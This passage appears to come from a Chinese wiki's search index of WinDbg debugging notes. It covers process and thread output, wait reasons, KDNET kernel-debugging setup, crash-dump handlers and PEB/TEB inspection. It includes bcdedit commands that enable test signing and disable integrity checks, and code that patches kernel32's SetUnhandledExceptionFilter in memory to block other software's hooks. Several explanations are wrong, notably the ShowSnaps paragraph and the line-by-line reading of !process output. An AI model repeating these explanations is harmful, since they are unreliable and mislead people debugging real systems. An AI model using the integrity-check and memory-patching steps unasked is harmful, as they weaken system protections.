UserMode Alertable fffffa800c471060 SynchronizationTimer fffffa800c42d200 SynchronizationTimer fffffa800c467680 SynchronizationEvent fffffa800c48b440 SynchronizationEvent fffffa800c47f1f0 SynchronizationEvent fffffa800c534060 SynchronizationEvent fffffa800c556060 SynchronizationEvent fffffa800c5212f0 SynchronizationEvent fffffa800c5213f0 SynchronizationEvent fffffa800c41f5d0 SynchronizationTimer fffffa800c4595d0 SynchronizationTimer fffffa800c592240 SynchronizationEvent fffffa800c593b00 ProcessObject fffffa800c459550 SynchronizationEvent fffffa800c59b400 SynchronizationEvent fffffa800c3f6810 SynchronizationEvent fffffa800c5a1120 SynchronizationEvent fffffa800c5b5120 SynchronizationEvent fffffa800c482610 SynchronizationTimer fffffa800c466060 SynchronizationEvent fffffa800c59b060 SynchronizationEvent fffffa800c3ec2d0 SynchronizationEvent fffffa800c466240 SynchronizationEvent THREAD fffffa800c4ad370 Cid 06fc.0708 Teb: 000007fffffda000 Win32Thread: fffff900c07cac10 WAIT: (UserRequest) UserMode Non-Alertable fffffa800cbdf3e0 SynchronizationEvent THREAD fffffa800c4a2060 Cid 06fc.0714 Teb: 000007fffff9e000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c4a9110 NotificationEvent THREAD fffffa800c537370 Cid 06fc.0718 Teb: 000007fffff9c000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa80075eb840 NotificationEvent THREAD fffffa800c54c370 Cid 06fc.0724 Teb: 000007fffff9a000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c556140 NotificationEvent THREAD fffffa800c54a060 Cid 06fc.072c Teb: 000007fffffd6000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c5386b0 SynchronizationEvent fffffa800c521370 NotificationEvent fffffa800c521140 NotificationEvent fffffa800c54a5b0 NotificationEvent fffffa800c543760 NotificationEvent THREAD fffffa800c51e060 Cid 06fc.0734 Teb: 000007fffff96000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800b2f8600 SynchronizationEvent fffffa800c5341d0 SynchronizationEvent fffffa800c556620 SynchronizationEvent fffffa800c583780 SynchronizationEvent fffffa800c5ce280 SynchronizationEvent fffffa800cbcf660 SynchronizationEvent THREAD fffffa800c41e380 Cid 06fc.0754 Teb: 000007fffff94000 Win32Thread: 0000000000000000 WAIT: (WrLpcReply) UserMode Non-Alertable fffffa800c41e748 Semaphore Limit 0x1 THREAD fffffa800c41f060 Cid 06fc.075c Teb: 000007fffff90000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c5b53c0 QueueObject THREAD fffffa800c466300 Cid 06fc.0760 Teb: 000007fffff8e000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Alertable fffffa800c3ec060 SynchronizationEvent THREAD fffffa800c461060 Cid 06fc.0764 Teb: 000007fffff8c000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c41f790 SynchronizationEvent fffffa800c41f810 NotificationEvent THREAD fffffa8007c92060 Cid 06fc.00a0 Teb: 000007fffffd8000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa800780e640 Cid 06fc.19f0 Teb: 000007fffff98000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa80078fe650 Cid 06fc.1010 Teb: 000007fffff92000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa8007ebdb50 Cid 06fc.12e4 Teb: 000007fffff8a000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800d8a88c0 SynchronizationEvent THREAD fffffa8008228b50 Cid 06fc.0e3c Teb: 000007fffff88000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa8007800b50 Cid 06fc.0440 Teb: 000007fffff86000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject 这是Windows Debugger（WinDbg）中!process命令的输出，提供了关于特定进程的信息。 第一行显示了进程的ID，即fffffa800c5c8060。 第二行显示了进程的会话ID，即0。 第三行显示了调用进程的ID，即025c。 第四行显示了进程在内存中的基地址，即1f8dfb000。 第五行显示了进程的对象表，即ffff8a0020a44e0。 第六行显示了进程的句柄数，即281。第七行显示了进程的图像，即svchost.exe。 第八行显示了进程的虚拟地址根，即ffffa800c5c8570。 第九行显示了进程中的VAD（虚拟地址目录）数，即128。 第十行显示了进程是否为克隆进程，即0。 第十一行显示了进程是否为私有进程，即2532。 第十二行显示了进程的修改计数，即992。 第十三行显示了进程的锁定计数，即0。 第十四行显示了进程的设备映射，即ffff8a001b400b0。 第十五行显示了进程的令牌，即ffff8a0020ac060。 第十六行显示了进程的运行时间，即00:06:27.486。 第十七行显示了进程的用户时间，即00:00:00.046。 第十八行显示了进程的内核时间，即00:00:00.093。 第十九行显示了进程的配额池使用情况，即94704用于页面池和32760用于非页面池。 第二十行显示了进程的工作集大小，即4303用于现在、50用于最小和345用于最大。 第二十一行显示了进程的峰值工作集大小，即4717。 第二十二行显示了进程的虚拟大小，即57 MB。 第二十三行显示了进程的峰值虚拟大小，也是57 MB。 第二十四行显示了进程的页面故障次数，即6769。 第二十五行显示了进程的内存优先级，即BACKGROUND。 第二十六行显示了进程的基本优先级，即8。 第二十七行显示了进程的提交量，即2766。 最后一部分输出显示了进程的线程。每个线程都用一行表示，包括线程ID、Cid（连接ID）、Teb（线程环境块）和等待类型和等待的对象。 查看某个进程 1234# 查看某个进程!process 0 0 目标进程名 获取目标进程EPROCESS基本信息# 例如查看 svchost.exe!process 0 0 svchost.exe .process &#x2F;p +EPROCESS信息 切换到目标进程空间 1.process /p 进程地址 .reload &#x2F;f &#x2F;user 强制重新加载用户态符号 1.reload /f /user .process &#x2F;i &#x2F;p 目标进程的EPROCESS 侵入式调试 1.process /i /p 进程地址 bp 目标API 执行下断点命令 遍历大小固定的结构体如下所示 00007ffdf4044028 地址存放的是一个 _UNICODE_STRING* 的指针， _UNICODE_STRING 的大小为 0x10。 12345.for (r $t0=0;@$t0&lt;3;r $t0=@$t0+1)&#123; r $t1=$t0*0x10; dS 00007ffd`f4044028+$t1 &#125; # 如果不知道结构体大小是多少，可以使用??命令计算&gt; ??sizeof(nt!_UNICODE_STRING) unsigned int64 0x10 运行结果如下所示，打印了三个字符串。"},{"title":"【调试技术】windbg内核调试","date":"2024-04-16T03:41:48.587Z","path":"wiki/调试技术/【调试技术】windbg内核调试.html","text":"概述： 参考：WinDbg (内核模式) 入门 - Windows drivers | Microsoft Learn 命令整理-辅助类1eb ntdll!ShowSnaps 1 线程等待原因12345678910111213141516171819202122232425262728293031enum KWAIT_REASON&#123; Executive, FreePage, PageIn, PoolAllocation, DelayExecution, Suspended, UserRequest, WrExecutive, WrFreePage, WrPageIn, WrPoolAllocation, WrDelayExecution, WrSuspended, WrUserRequest, WrEventPair, WrQueue, WrLpcReceive, WrLpcReply, WrVirtualMemory, WrPageOut, WrRendezvous, Spare2, Spare3, Spare4, Spare5, Spare6, WrKernel, MaximumWaitReason&#125;; KWAIT_REASON是一个枚举类型，定义在Windows内核中，用于表示进程或线程等待的原因。以下是每个枚举值的含义： Executive: 进程或线程正在等待执行。 FreePage: 进程或线程正在等待空闲页。 PageIn: 进程或线程正在等待页面被载入内存。 PoolAllocation: 进程或线程正在等待资源池的分配。 DelayExecution: 进程或线程正在等待以执行延迟操作。 Suspended: 进程或线程被挂起，无法执行操作。 UserRequest: 进程或线程正在等待来自用户的请求。 WrExecutive: 与Executive相同。 WrFreePage: 与FreePage相同。 WrPageIn: 与PageIn相同。 WrPoolAllocation: 与PoolAllocation相同。 WrDelayExecution: 与DelayExecution相同。 WrSuspended: 与Suspended相同。 WrUserRequest: 与UserRequest相同。 WrEventPair: 进程或线程正在等待事件对的触发。 WrQueue: 进程或线程正在等待队列的处理。 WrLpcReceive: 进程或线程正在等待接收LPC（本地过程调用）消息。 WrLpcReply: 进程或线程正在等待回复LPC（本地过程调用）消息。 WrVirtualMemory: 进程或线程正在等待虚拟内存的操作。 WrPageOut: 进程或线程正在等待页面被写出。 Rendezvous: 进程或线程正在等待 rendezvous（汇聚）操作。 Spare2: 保留，未使用。 Spare3: 保留，未使用。 Spare4: 保留，未使用。 Spare5: 保留，未使用。 Spare6: 保留，未使用。 WrKernel: 进程或线程正在等待内核操作。 MaximumWaitReason: 枚举的最后一个元素，用于指示已达到最大等待原因数量。 这些枚举值用于Windows操作系统的进程和线程调度，以及在崩溃时生成dump文件以进行问题排查和修复。"},{"title":"【调试技术】windows双机调试——Net模式","date":"2024-04-16T03:41:28.876Z","path":"wiki/调试技术/【调试技术】双机调试.html","text":"概述：windows 双机调试可以在主页搜索 bcdedit 命令。双机调试是一个非常有用的技术，方便内核、驱动等调试场景。本文主要记录使用net调试的配置步骤。 参考微软官方文档：Set up KDNET network kernel debugging manually - Windows drivers | Microsoft Learn 配置目标主机说明：需要两台机器之间可以ping通 开启调试模式注意：不能有多余的空格 123bcdedit /debug onbcdedit /dbgsettings net hostip:w.x.y.z port:n .cniiakrfxppz{zoom:80%;} 存在多个网卡时如果目标机有多个网卡，还需要执行如下命令： 1bcdedit /set &#123;dbgsettings&#125; busparams b.d.f 其中b为总线号，d为设备号，f为功能号，这些可以在设备管理器中查到。 .nityziexdncu{zoom:80%;} 禁用签名校验12bcdedit.exe -set TESTSIGNING ONbcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS 上述配置完成后，重启操作系统 配置windbg执行完上述命令后会得到一个key值，将key值填入到windbg页面中，如下所示： 配置符号文件路径1srv*D:\\Symbols*https://msdl.microsoft.com/download/symbols 命令行方式连接 kd命令 1kd -k net:port=&lt;n&gt;,key=&lt;MyKey&gt; windbg连接 1windbg -k net:port=&lt;n&gt;,key=&lt;MyKey&gt; 重启调试如下所示：重启后直接断点，可以从操作系统启动阶段开始调试了 或者使用cmd命令 1shutdown -r -t 0 双机调试模式下调试用户态进程过程如下：1、!process 0 0 目标进程名 获取目标进程EPROCESS基本信息2、.process &#x2F;p +EPROCESS信息 切换到目标进程空间3、.reload &#x2F;f &#x2F;user 强制重新加载用户态符号4、.process &#x2F;i &#x2F;p 目标进程的EPROCESS 侵入式调试5、bp 目标API 执行下断点命令"},{"title":"windows 程序自动生成dump文件","date":"2024-04-16T03:41:24.450Z","path":"wiki/调试技术/【调试技术】生成dump.html","text":"[toc] 一、Windows 生成dump 本文主要说明windows操作系统下，程序如何自动生成dump文件 如果生成dump生成dump主要依赖于windowsapi函数 SetUnhandledExceptionFilter,参数为一个回调函数，主要依赖于该函数以及回调函数中的相关逻辑生成dump。 12LPTOP_LEVEL_EXCEPTION_FILTER WINAPI SetUnhandledExceptionFilter( _In_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter） 注意点： 最好是在程序开始处设置回调 如果回调不生效，也可使用 AddVectoredExceptionHandler 函数设置回调，其用法与 SetUnhandledExceptionFilter 基本一致，但是需要注意的是，使用 AddVectoredExceptionHandler 后，outpuydebugstring 也会触发回调，所以这个函数慎用。 dump回调函数dump回调函数可根据自己的需求去编写，以下为一个示例： 1234567891011121314151617181920212223242526272829303132LONG WINAPI MyUnhandledExceptionFilter( struct _EXCEPTION_POINTERS *ExceptionInfo )&#123; SYSTEMTIME st; GetLocalTime(&amp;st); CString time_now = _T(&quot;&quot;); time_now.Format(_T(&quot;%04d_%02d_%02d_%02d_%02d_%03d.dmp&quot;), st.wYear, st.wMonth, st.wDay,st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); CString dump_file_path = GetRootPath(); //获取程序所在的文件夹的路径 dump_file_path += _T(&quot;dump/&quot;); CreateDirectory(dump_file_path, NULL); dump_file_path += time_now; HANDLE hFile = CreateFile(dump_file_path, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if( hFile == INVALID_HANDLE_VALUE ) return EXCEPTION_CONTINUE_EXECUTION; // 往下传，继续交给 windows 默认的处理函数处理 MINIDUMP_EXCEPTION_INFORMATION mdei; mdei.ThreadId = GetCurrentThreadId(); mdei.ExceptionPointers = ExceptionInfo; mdei.ClientPointers = NULL; MINIDUMP_CALLBACK_INFORMATION mci; mci.CallbackRoutine = NULL; mci.CallbackParam = 0; MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hFile, MiniDumpNormal, &amp;mdei, NULL, &amp;mci); CloseHandle(hFile); return EXCEPTION_EXECUTE_HANDLER;&#125; 设置回调写完回调函数之后，调用 SetUnhandledExceptionFilter ，入参为回调函数。 1SetUnhandledExceptionFilter(MyUnhandledExceptionFilter); 到此，设置并捕获异常的接口完成，以下补充几点个人经验。 二、手写崩溃12345void CreteCrash()&#123; int *ptr = nullptr; *ptr = n;&#125; 三、回调不生效问题 SetUnhandledExceptionFilter 是无法捕获 printf, scan, strlen 等CRT函数的异常的，如printf(NULL) 异常;除此之外，在有的环境当中，因为软件被hook的问题，导致 函数不生效，设置的回调往往不起作用，此时可以修改设置 的函数地址来屏蔽其他软件的hook。 代码123456789101112131415161718192021void DisableSetUnhandledExceptionFilter()&#123; void* addr = (void*)GetProcAddress(LoadLibrary(_T(&quot;kernel32.dll&quot;)), &quot;SetUnhandledExceptionFilter&quot;); if (addr != NULL) &#123; unsigned char code[16]; int size = 0; code[size++] = 0x33; code[size++] = 0xC0; code[size++] = 0xC2; code[size++] = 0x04; code[size++] = 0x00; DWORD dwOldFlag, dwTempFlag; VirtualProtect(addr, size, PAGE_READWRITE, &amp;dwOldFlag); WriteProcessMemory(GetCurrentProcess(), addr, code, size, NULL); VirtualProtect(addr, size, dwOldFlag, &amp;dwTempFlag); &#125;&#125; 使用说明在程序启动并设置dump回调之后调用 DisableSetUnhandledExceptionFilter即可。 注意事项经本人测试，在部分机器上，使用 WriteProcessMemory和 VirtualProtect 可能会导致程序崩溃，并且不会生成dump。可尝试修改 VirtualProtect 和 WriteProcessMemory 函数的参数测试。 方案一修改 VirtualProtect 的 flag.设置为 PAGE_EXECUTE_READWRITE 1VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); 方案二WriteProcessMemory 可直接使用 memcpy 替代。 1memcpy(addr, code, size); 代码总结123456789101112131415DWORD dwOldFlag = 0;VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag);#if 0HANDLE hProcess = GetCurrentProcess();if (!(hProcess == NULL || hProcess == INVALID_HANDLE_VALUE))&#123; WriteProcessMemory(GetCurrentProcess(), addr, code, size, NULL);&#125;else&#123; memcpy(addr, code, size);&#125;#endifmemcpy(addr, code, size);VirtualProtect(addr, size, dwOldFlag, &amp;dwOldFlag);"},{"title":"【windbg】各种场景下的调试情况汇总","date":"2024-04-16T03:41:19.006Z","path":"wiki/调试技术/【调试技术】各种场景下调试汇总.html","text":"概述：整理汇总各种场景下的调试方法 可参考微软官方文档调试：调试方法 - Windows drivers | Microsoft Learn 调试LDR12345678910bp ntdll!LdrLoadDll在断点下输入：eb Kd_LDR_MASK ffffffffeb Kd_MM_MASK ffffffffeb Kd_DEFAULT_MASK ffffffffeb ntdll!ShowSnaps 1eb ntdll!ShowErrors 1 查看dll加载1eb ntdll!ShowSnaps 1 eb ntdll!ShowSnaps 1这一命令是在Windows的NT操作系统内核（ntdll.dll）中调试多线程应用程序时使用的。它用于启用或禁用快照调试（Snapshots），这是一种在调试期间捕获特定系统状态的调试技术。 在这里，eb是指“编辑二进制”（Edit Binary）的命令，它允许你修改内存中的二进制数据。ntdll!ShowSnaps是你要修改的函数，而1是你要设置的值。在调试多线程应用时，ShowSnaps函数用于控制是否启用快照调试。如果将其设置为1，则启用快照调试；如果设置为0，则禁用快照调试。 需要注意的是，修改系统内核的代码可能会对系统造成严重的破坏，因此，除非你非常清楚自己在做什么，否则不建议进行这样的操作。在大多数情况下，如果你认为需要修改系统内核的代码来调试你的应用程序，那么你可能需要寻找其他方法，或者寻求专业的帮助。"},{"title":"【调试技术】用户态查看PEB和TEB","date":"2024-04-16T03:41:31.383Z","path":"wiki/调试技术/【调试技术】用户态查看PEB和TEB.html","text":"概述：用户态查看进程 PEB 和 TEB(通过windbg附加或启动调试的exe) 0x01 用户态查看 TEB 和 PEB在双机调试的时候，可以直接使用 !PEB PID 和 !TEB TID 获取进程和线程的相关信息，在用户态这两个命令就会失效。原因就是用户态不支持&#x3D;&#x3D;大写&#x3D;&#x3D;的 !TEB 和 !PEB 命令。 在用户态调试时获取 teb 和 peb 的命令是小写的。 12345#获取 peb!peb# 获取 teb!teb 除此之外，这里提供另外一种思路。我们都知道 &#x3D;&#x3D;TEB&#x3D;&#x3D; 结构体中保存了&#x3D;&#x3D;PEB&#x3D;&#x3D;的地址，因此可以通过&#x3D;&#x3D;TEB&#x3D;&#x3D;获取PEB的相关信息。 这里以 notepad.exe 为例演示。 0x02 演示准备步骤 运行 &#x3D;&#x3D;notepad.exe&#x3D;&#x3D;， Win+R 输入 notepad 回车即可。 运行 windbg，并附加到进程 notepad.exe 上。 开始调试查看当前线程使用 ~. 查看当前线程(这里其实查看哪个线程都可以，因为当前进程的 PEB 只有一个，所有的 TEB 都指向了同一个 PEB) 12340:007&gt; ~.. 7 Id: b8f4.d5a0 Suspend: 1 Teb: 000000a3`b61d1000 Unfrozen Start: ntdll!DbgUiRemoteBreakin (00007ff9`ab83c9c0) Priority: 0 Priority class: 32 Affinity: ff 可以看到 Teb 地址为 $000000a3&#96;b61d1000$ 查看TEB1dt ntdll!_Teb 000000a3`b61d1000 输出如下所示，可以看到 0x060 偏移处为 _PEB： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271280:007&gt; dt ntdll!_Teb 000000a3`b61d1000 +0x000 NtTib : _NT_TIB +0x038 EnvironmentPointer : (null) +0x040 ClientId : _CLIENT_ID +0x050 ActiveRpcHandle : (null) +0x058 ThreadLocalStoragePointer : (null) +0x060 ProcessEnvironmentBlock : 0x000000a3`b61b8000 _PEB +0x068 LastErrorValue : 0 +0x06c CountOfOwnedCriticalSections : 0 +0x070 CsrClientThread : (null) +0x078 Win32ThreadInfo : (null) +0x080 User32Reserved : [26] 0 +0x0e8 UserReserved : [5] 0 +0x100 WOW32Reserved : (null) +0x108 CurrentLocale : 0x804 +0x10c FpSoftwareStatusRegister : 0 +0x110 ReservedForDebuggerInstrumentation : [16] (null) +0x190 SystemReserved1 : [30] (null) +0x280 PlaceholderCompatibilityMode : 0 &#x27;&#x27; +0x281 PlaceholderHydrationAlwaysExplicit : 0 &#x27;&#x27; +0x282 PlaceholderReserved : [10] &quot;&quot; +0x28c ProxiedProcessId : 0 +0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK +0x2b8 WorkingOnBehalfTicket : [8] &quot;&quot; +0x2c0 ExceptionCode : 0n0 +0x2c4 Padding0 : [4] &quot;&quot; +0x2c8 ActivationContextStackPointer : 0x000000a3`b61d1290 _ACTIVATION_CONTEXT_STACK +0x2d0 InstrumentationCallbackSp : 0 +0x2d8 InstrumentationCallbackPreviousPc : 0 +0x2e0 InstrumentationCallbackPreviousSp : 0 +0x2e8 TxFsContext : 0xfffe +0x2ec InstrumentationCallbackDisabled : 0 &#x27;&#x27; +0x2ed UnalignedLoadStoreExceptions : 0 &#x27;&#x27; +0x2ee Padding1 : [2] &quot;&quot; +0x2f0 GdiTebBatch : _GDI_TEB_BATCH +0x7d8 RealClientId : _CLIENT_ID +0x7e8 GdiCachedProcessHandle : (null) +0x7f0 GdiClientPID : 0 +0x7f4 GdiClientTID : 0 +0x7f8 GdiThreadLocalInfo : (null) +0x800 Win32ClientInfo : [62] 0 +0x9f0 glDispatchTable : [233] (null) +0x1138 glReserved1 : [29] 0 +0x1220 glReserved2 : (null) +0x1228 glSectionInfo : (null) +0x1230 glSection : (null) +0x1238 glTable : (null) +0x1240 glCurrentRC : (null) +0x1248 glContext : (null) +0x1250 LastStatusValue : 0 +0x1254 Padding2 : [4] &quot;&quot; +0x1258 StaticUnicodeString : _UNICODE_STRING &quot;&quot; +0x1268 StaticUnicodeBuffer : [261] &quot;&quot; +0x1472 Padding3 : [6] &quot;&quot; +0x1478 DeallocationStack : 0x000000a3`b6400000 Void +0x1480 TlsSlots : [64] (null) +0x1680 TlsLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x1690 Vdm : (null) +0x1698 ReservedForNtRpc : (null) +0x16a0 DbgSsReserved : [2] (null) +0x16b0 HardErrorMode : 0 +0x16b4 Padding4 : [4] &quot;&quot; +0x16b8 Instrumentation : [11] (null) +0x1710 ActivityId : _GUID &#123;00000000-0000-0000-0000-000000000000&#125; +0x1720 SubProcessTag : (null) +0x1728 PerflibData : (null) +0x1730 EtwTraceData : (null) +0x1738 WinSockData : (null) +0x1740 GdiBatchCount : 0 +0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER +0x1744 IdealProcessorValue : 0x3030000 +0x1744 ReservedPad0 : 0 &#x27;&#x27; +0x1745 ReservedPad1 : 0 &#x27;&#x27; +0x1746 ReservedPad2 : 0x3 &#x27;&#x27; +0x1747 IdealProcessor : 0x3 &#x27;&#x27; +0x1748 GuaranteedStackBytes : 0 +0x174c Padding5 : [4] &quot;&quot; +0x1750 ReservedForPerf : (null) +0x1758 ReservedForOle : (null) +0x1760 WaitingOnLoaderLock : 0 +0x1764 Padding6 : [4] &quot;&quot; +0x1768 SavedPriorityState : (null) +0x1770 ReservedForCodeCoverage : 0 +0x1778 ThreadPoolData : (null) +0x1780 TlsExpansionSlots : (null) +0x1788 DeallocationBStore : (null) +0x1790 BStoreLimit : (null) +0x1798 MuiGeneration : 0 +0x179c IsImpersonating : 0 +0x17a0 NlsCache : (null) +0x17a8 pShimData : (null) +0x17b0 HeapData : 0 +0x17b4 Padding7 : [4] &quot;&quot; +0x17b8 CurrentTransactionHandle : (null) +0x17c0 ActiveFrame : (null) +0x17c8 FlsData : (null) +0x17d0 PreferredLanguages : (null) +0x17d8 UserPrefLanguages : (null) +0x17e0 MergedPrefLanguages : (null) +0x17e8 MuiImpersonation : 0 +0x17ec CrossTebFlags : 0 +0x17ec SpareCrossTebBits : 0y0000000000000000 (0) +0x17ee SameTebFlags : 8 +0x17ee SafeThunkCall : 0y0 +0x17ee InDebugPrint : 0y0 +0x17ee HasFiberData : 0y0 +0x17ee SkipThreadAttach : 0y1 +0x17ee WerInShipAssertCode : 0y0 +0x17ee RanProcessInit : 0y0 +0x17ee ClonedThread : 0y0 +0x17ee SuppressDebugMsg : 0y0 +0x17ee DisableUserStackWalk : 0y0 +0x17ee RtlExceptionAttached : 0y0 +0x17ee InitialThread : 0y0 +0x17ee SessionAware : 0y0 +0x17ee LoadOwner : 0y0 +0x17ee LoaderWorker : 0y0 +0x17ee SkipLoaderInit : 0y0 +0x17ee SpareSameTebBits : 0y0 +0x17f0 TxnScopeEnterCallback : (null) +0x17f8 TxnScopeExitCallback : (null) +0x1800 TxnScopeContext : (null) +0x1808 LockCount : 0 +0x180c WowTebOffset : 0n0 +0x1810 ResourceRetValue : (null) +0x1818 ReservedForWdf : (null) +0x1820 ReservedForCrt : 0 +0x1828 EffectiveContainerId : _GUID &#123;00000000-0000-0000-0000-000000000000&#125; 查看PEB1234dt ntdll!_PEB 0xa3b61b8000# 或者使用 dx 命令dx -r1 ((ntdll!_PEB *)0xa3b61b8000) 输出如下所示，到此就看到了 &#x3D;&#x3D;notepad&#x3D;&#x3D; 的 PEB 了。后文补充了 PEB 结构体中 ProcessParameters 变量的分析和查看。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151160:007&gt; dt ntdll!_PEB 0xa3b61b8000 +0x000 InheritedAddressSpace : 0 &#x27;&#x27; +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27; +0x002 BeingDebugged : 0x1 &#x27;&#x27; +0x003 BitField : 0x84 &#x27;&#x27; +0x003 ImageUsesLargePages : 0y0 +0x003 IsProtectedProcess : 0y0 +0x003 IsImageDynamicallyRelocated : 0y1 +0x003 SkipPatchingUser32Forwarders : 0y0 +0x003 IsPackagedProcess : 0y0 +0x003 IsAppContainer : 0y0 +0x003 IsProtectedProcessLight : 0y0 +0x003 IsLongPathAwareProcess : 0y1 +0x004 Padding0 : [4] &quot;&quot; +0x008 Mutant : 0xffffffff`ffffffff Void +0x010 ImageBaseAddress : 0x00007ff7`7ef80000 Void +0x018 Ldr : 0x00007ff9`ab8db4c0 _PEB_LDR_DATA +0x020 ProcessParameters : 0x000001a6`50d52540 _RTL_USER_PROCESS_PARAMETERS +0x028 SubSystemData : 0x00007ff9`9f7af1d0 Void +0x030 ProcessHeap : 0x000001a6`50d50000 Void +0x038 FastPebLock : 0x00007ff9`ab8db0e0 _RTL_CRITICAL_SECTION +0x040 AtlThunkSListPtr : (null) +0x048 IFEOKey : (null) +0x050 CrossProcessFlags : 1 +0x050 ProcessInJob : 0y1 +0x050 ProcessInitializing : 0y0 +0x050 ProcessUsingVEH : 0y0 +0x050 ProcessUsingVCH : 0y0 +0x050 ProcessUsingFTH : 0y0 +0x050 ProcessPreviouslyThrottled : 0y0 +0x050 ProcessCurrentlyThrottled : 0y0 +0x050 ProcessImagesHotPatched : 0y0 +0x050 ReservedBits0 : 0y000000000000000000000000 (0) +0x054 Padding1 : [4] &quot;&quot; +0x058 KernelCallbackTable : 0x00007ff9`a9a80070 Void +0x058 UserSharedInfoPtr : 0x00007ff9`a9a80070 Void +0x060 SystemReserved : 0 +0x064 AtlThunkSListPtr32 : 0 +0x068 ApiSetMap : 0x000001a6`50c80000 Void +0x070 TlsExpansionCounter : 0 +0x074 Padding2 : [4] &quot;&quot; +0x078 TlsBitmap : 0x00007ff9`ab8db440 Void +0x080 TlsBitmapBits : [2] 0xffffffff +0x088 ReadOnlySharedMemoryBase : 0x00007df4`3dce0000 Void +0x090 SharedData : (null) +0x098 ReadOnlyStaticServerData : 0x00007df4`3dce0750 -&gt; (null) +0x0a0 AnsiCodePageData : 0x00007df5`3fe30000 Void +0x0a8 OemCodePageData : 0x00007df5`3fe30000 Void +0x0b0 UnicodeCaseTableData : 0x00007df5`3fe60028 Void +0x0b8 NumberOfProcessors : 8 +0x0bc NtGlobalFlag : 0 +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000 +0x0c8 HeapSegmentReserve : 0x100000 +0x0d0 HeapSegmentCommit : 0x2000 +0x0d8 HeapDeCommitTotalFreeThreshold : 0x10000 +0x0e0 HeapDeCommitFreeBlockThreshold : 0x1000 +0x0e8 NumberOfHeaps : 6 +0x0ec MaximumNumberOfHeaps : 0x10 +0x0f0 ProcessHeaps : 0x00007ff9`ab8d9d40 -&gt; 0x000001a6`50d50000 Void +0x0f8 GdiSharedHandleTable : 0x000001a6`51120000 Void +0x100 ProcessStarterHelper : (null) +0x108 GdiDCAttributeList : 0x14 +0x10c Padding3 : [4] &quot;&quot; +0x110 LoaderLock : 0x00007ff9`ab8d55c8 _RTL_CRITICAL_SECTION +0x118 OSMajorVersion : 0xa +0x11c OSMinorVersion : 0 +0x120 OSBuildNumber : 0x4a65 +0x122 OSCSDVersion : 0 +0x124 OSPlatformId : 2 +0x128 ImageSubsystem : 2 +0x12c ImageSubsystemMajorVersion : 0xa +0x130 ImageSubsystemMinorVersion : 0 +0x134 Padding4 : [4] &quot;&quot; +0x138 ActiveProcessAffinityMask : 0xff +0x140 GdiHandleBuffer : [60] 0 +0x230 PostProcessInitRoutine : (null) +0x238 TlsExpansionBitmap : 0x00007ff9`ab8db420 Void +0x240 TlsExpansionBitmapBits : [32] 1 +0x2c0 SessionId : 1 +0x2c4 Padding5 : [4] &quot;&quot; +0x2c8 AppCompatFlags : _ULARGE_INTEGER 0x0 +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0 +0x2d8 pShimData : 0x000001a6`50cc0000 Void +0x2e0 AppCompatInfo : (null) +0x2e8 CSDVersion : _UNICODE_STRING &quot;&quot; +0x2f8 ActivationContextData : 0x000001a6`50cb0000 _ACTIVATION_CONTEXT_DATA +0x300 ProcessAssemblyStorageMap : 0x000001a6`50d5b5c0 _ASSEMBLY_STORAGE_MAP +0x308 SystemDefaultActivationContextData : 0x000001a6`50ca0000 _ACTIVATION_CONTEXT_DATA +0x310 SystemAssemblyStorageMap : (null) +0x318 MinimumStackCommit : 0 +0x320 SparePointers : [4] (null) +0x340 SpareUlongs : [5] 0 +0x358 WerRegistrationData : 0x000001a6`52e00000 Void +0x360 WerShipAssertPtr : (null) +0x368 pUnused : (null) +0x370 pImageHeaderHash : (null) +0x378 TracingFlags : 0 +0x378 HeapTracingEnabled : 0y0 +0x378 CritSecTracingEnabled : 0y0 +0x378 LibLoaderTracingEnabled : 0y0 +0x378 SpareTracingBits : 0y00000000000000000000000000000 (0) +0x37c Padding6 : [4] &quot;&quot; +0x380 CsrServerReadOnlySharedMemoryBase : 0x00007df4`66cb0000 +0x388 TppWorkerpListLock : 0 +0x390 TppWorkerpList : _LIST_ENTRY [ 0x000000a3`b5f0f860 - 0x000000a3`b63ffb70 ] +0x3a0 WaitOnAddressHashTable : [128] (null) +0x7a0 TelemetryCoverageHeader : (null) +0x7a8 